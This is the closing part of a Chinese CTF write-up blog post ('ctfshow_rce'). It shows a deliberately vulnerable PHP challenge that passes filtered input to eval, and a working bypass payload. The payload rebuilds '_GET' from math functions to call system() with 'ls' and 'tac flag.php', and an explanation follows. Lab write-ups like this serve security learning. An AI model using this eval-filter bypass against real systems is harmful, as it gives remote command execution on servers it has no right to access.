</span></span><span class="line"><span class="cl">    <span class="nv">$blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;\t&#39;</span><span class="p">,</span> <span class="s1">&#39;\r&#39;</span><span class="p">,</span> <span class="s1">&#39;\n&#39;</span><span class="p">,</span><span class="s1">&#39;\&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39;`&#39;</span><span class="p">,</span> <span class="s1">&#39;\[&#39;</span><span class="p">,</span> <span class="s1">&#39;\]&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$blacklist</span> <span class="k">as</span> <span class="nv">$blackitem</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$blackitem</span> <span class="o">.</span> <span class="s1">&#39;/m&#39;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;请不要输入奇奇怪怪的字符&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$whitelist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;abs&#39;</span><span class="p">,</span> <span class="s1">&#39;acos&#39;</span><span class="p">,</span> <span class="s1">&#39;acosh&#39;</span><span class="p">,</span> <span class="s1">&#39;asin&#39;</span><span class="p">,</span> <span class="s1">&#39;asinh&#39;</span><span class="p">,</span> <span class="s1">&#39;atan2&#39;</span><span class="p">,</span> <span class="s1">&#39;atan&#39;</span><span class="p">,</span> <span class="s1">&#39;atanh&#39;</span><span class="p">,</span> <span class="s1">&#39;base_convert&#39;</span><span class="p">,</span> <span class="s1">&#39;bindec&#39;</span><span class="p">,</span> <span class="s1">&#39;ceil&#39;</span><span class="p">,</span> <span class="s1">&#39;cos&#39;</span><span class="p">,</span> <span class="s1">&#39;cosh&#39;</span><span class="p">,</span> <span class="s1">&#39;decbin&#39;</span><span class="p">,</span> <span class="s1">&#39;dechex&#39;</span><span class="p">,</span> <span class="s1">&#39;decoct&#39;</span><span class="p">,</span> <span class="s1">&#39;deg2rad&#39;</span><span class="p">,</span> <span class="s1">&#39;exp&#39;</span><span class="p">,</span> <span class="s1">&#39;expm1&#39;</span><span class="p">,</span> <span class="s1">&#39;floor&#39;</span><span class="p">,</span> <span class="s1">&#39;fmod&#39;</span><span class="p">,</span> <span class="s1">&#39;getrandmax&#39;</span><span class="p">,</span> <span class="s1">&#39;hexdec&#39;</span><span class="p">,</span> <span class="s1">&#39;hypot&#39;</span><span class="p">,</span> <span class="s1">&#39;is_finite&#39;</span><span class="p">,</span> <span class="s1">&#39;is_infinite&#39;</span><span class="p">,</span> <span class="s1">&#39;is_nan&#39;</span><span class="p">,</span> <span class="s1">&#39;lcg_value&#39;</span><span class="p">,</span> <span class="s1">&#39;log10&#39;</span><span class="p">,</span> <span class="s1">&#39;log1p&#39;</span><span class="p">,</span> <span class="s1">&#39;log&#39;</span><span class="p">,</span> <span class="s1">&#39;max&#39;</span><span class="p">,</span> <span class="s1">&#39;min&#39;</span><span class="p">,</span> <span class="s1">&#39;mt_getrandmax&#39;</span><span class="p">,</span> <span class="s1">&#39;mt_rand&#39;</span><span class="p">,</span> <span class="s1">&#39;mt_srand&#39;</span><span class="p">,</span> <span class="s1">&#39;octdec&#39;</span><span class="p">,</span> <span class="s1">&#39;pi&#39;</span><span class="p">,</span> <span class="s1">&#39;pow&#39;</span><span class="p">,</span> <span class="s1">&#39;rad2deg&#39;</span><span class="p">,</span> <span class="s1">&#39;rand&#39;</span><span class="p">,</span> <span class="s1">&#39;round&#39;</span><span class="p">,</span> <span class="s1">&#39;sin&#39;</span><span class="p">,</span> <span class="s1">&#39;sinh&#39;</span><span class="p">,</span> <span class="s1">&#39;sqrt&#39;</span><span class="p">,</span> <span class="s1">&#39;srand&#39;</span><span class="p">,</span> <span class="s1">&#39;tan&#39;</span><span class="p">,</span> <span class="s1">&#39;tanh&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nx">preg_match_all</span><span class="p">(</span><span class="s1">&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">,</span> <span class="nv">$used_funcs</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$used_funcs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$func</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;请不要输入奇奇怪怪的函数&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//帮你算出答案
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">eval</span><span class="p">(</span><span class="s1">&#39;echo &#39;</span><span class="o">.</span><span class="nv">$content</span><span class="o">.</span><span class="s1">&#39;;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>当前目录下的文件：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos});&amp;abs=system&amp;acos=ls
</span></span></code></pre></td></tr></table>
</div>
</div><p>读取文件：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos});&amp;abs=system&amp;acos=tac flag.php
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="解析" class="headerLink">
    <a href="#%e8%a7%a3%e6%9e%90" class="header-mark"></a>解析</h4><p>$pi是因为题目限制只能用这个，其他的不让用 首先$pi的值是_GET，定义这个变量是因为为了动态调用php函数 动态调用 PHP 函数，需要使用 <code>$var{func}</code> 这种形式，其中 <code>$var</code> 是一个字符串，<code>{func}</code> 表示函数名。否则，如果直接使用 <code>$func</code>，则 PHP 引擎会将其解释为一个未定义的常量，并且会导致语法错误。 为了调用system函数，就要构造</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$pi{abs}($pi{acos});&amp;abs=system&amp;acos=ls
</span></span><span class="line"><span class="cl">$pi{abs}($pi{acos});&amp;abs=system&amp;acos=tac flag.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>因为<code>$pi</code> 是一个字符串，而不是一个函数。<code>$pi</code> 的值是通过将 <code>37907361743</code> 和 <code>1598506324</code> 作为参数传递给 <code>base_convert</code> 和 <code>dechex</code> 函数计算得到的字符串。因此，如果直接使用 <code>$pi{abs}($pi{acos})</code>，PHP 引擎将无法识别 <code>$pi</code> 变量中的函数名。 为了解决这个问题，可以使用 PHP 变量变量解析器和函数调用链来动态调用函数。具体来说，<code>$$pi{abs}</code> 将 <code>$pi{abs}</code> 解释为一个变量名，然后使用 <code>$pi{acos}</code> 作为该变量名的值进行函数调用。因此，<code>$$pi{abs}($$pi{acos})</code> 将会调用 <code>$pi{abs}($pi{acos})</code>。 所以要构造</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$$pi{abs}($$pi{acos});&amp;abs=system&amp;acos=ls
</span></span><span class="line"><span class="cl">$$pi{abs}($$pi{acos});&amp;abs=system&amp;acos=tac flag.php
</span></span></code></pre></td></tr></table>
</div>
</div></div>

        <div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2023-11-17</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"><span><a class="link-to-mardown" href=/ctfshow_rce/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\ctfshow_rce.md target="_blank" rel="noopener noreferrer">View source</a>
                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\ctfshow_rce.md target="_blank" rel="noopener noreferrer">Edit this page</a>
                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%20ctfshow_rce&body=|Field|Value|%0A|-|-|%0A|Title|ctfshow_rce|%0A|Url|http://scofield1920.github.io/ctfshow_rce/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\ctfshow_rce.md| target="_blank" rel="noopener noreferrer">Report issue</a>
                    </span></div>
            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/ctfshow_rce/" data-title="ctfshow_rce" data-hashtags="CTF,web"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/ctfshow_rce/" data-hashtag="CTF"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/ctfshow_rce/" data-title="ctfshow_rce"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/ctfshow_rce/" data-title="ctfshow_rce"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/ctfshow_rce/" data-title="ctfshow_rce"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/ctfshow_rce/" data-title="ctfshow_rce" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
        function shareOnMastodon(title, link) {
            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
            const domain = prompt("Enter your Mastodon domain", savedDomain);
            if (domain === null) {
                return;
            }
            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
            const text = title + "\n\n" + link;
            const url = new URL("https://" + domain)
            url.pathname = "share"
            url.searchParams.append('text', text)
            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
        }
    </script>
    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;ctfshow_rce&#34;, &#34;http://scofield1920.github.io/ctfshow_rce/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/web/">web</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/ctfshow_xxe/" class="prev" rel="prev" title="ctfshow_xxe"><i class="fas fa-angle-left fa-fw"></i>ctfshow_xxe</a>
            <a href="/ctfshow_file_upload/" class="next" rel="next" title="ctfshow_file_upload">ctfshow_file_upload<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
<div id="comments"><div id="utterances"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
            </noscript></div></article></div>
        </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">
                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.120.4">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
            <div class="footer-line"></div>
            <div class="footer-line">
            </div>
        </div></footer></div>

    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
            <i class="fas fa-arrow-up fa-fw"></i>
        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
            <i class="fas fa-comment fa-fw"></i>
        </a>
    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"\u003ci class='far fa-edit fa-fw'\u003e\u003c/i\u003eSc0fie1d-Blog","mobile-header-typeit":"\u003ci class='far fa-edit fa-fw'\u003e\u003c/i\u003eSc0fie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
</body>

</html>